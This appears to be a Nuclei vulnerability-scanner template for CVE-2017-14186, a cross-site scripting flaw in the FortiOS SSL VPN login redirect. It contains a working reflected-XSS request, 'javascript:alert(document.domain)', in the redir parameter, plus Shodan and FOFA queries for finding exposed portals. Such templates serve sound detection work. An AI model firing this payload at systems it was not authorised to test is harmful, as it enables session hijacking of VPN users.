http:
- matchers:
  - part: body
    type: word
    words:
    - location=decodeURIComponent("javascript%3Aalert%28document.domain%29"
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/remote/loginredir?redir=javascript:alert(document.domain)'
id: CVE-2017-14186
info:
  author: johnk3r
  classification:
    cpe: cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-14186
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.88152
    epss-score: 0.04051
  description: 'FortiGate FortiOS through SSL VPN Web Portal contains a cross-site
    scripting vulnerability. The login redir parameter is not sanitized, so an attacker
    can inject arbitrary script in the browser of an unsuspecting user in the context
    of the affected site. This can allow the attacker to steal cookie-based authentication
    credentials and launch other attacks such as a URL redirect. Affected versions
    are 6.0.0 to 6.0.4, 5.6.0 to 5.6.7, and 5.4 and below.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, data theft, or defacement.

    '
  metadata:
    fofa-query:
    - body="/remote/login" "xxxxxxxx"
    - icon_hash=945408572
    max-request: 1
    product: fortios
    shodan-query:
    - port:10443 http.favicon.hash:945408572
    - http.favicon.hash:945408572
    - cpe:"cpe:2.3:o:fortinet:fortios"
    - http.html:"/remote/login" "xxxxxxxx"
    vendor: fortinet
    verified: true
  name: FortiGate FortiOS SSL VPN Web Portal - Cross-Site Scripting
  reference:
  - https://www.fortiguard.com/psirt/FG-IR-17-242
  - https://fortiguard.com/advisory/FG-IR-17-242
  - https://web.archive.org/web/20210801135714/http://www.securitytracker.com/id/1039891
  - https://nvd.nist.gov/vuln/detail/CVE-2017-14186
  - http://www.securitytracker.com/id/1039891
  remediation: 'Apply the latest security patches or firmware updates provided by
    Fortinet to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2017,cve,fortigate,xss,fortinet,vuln
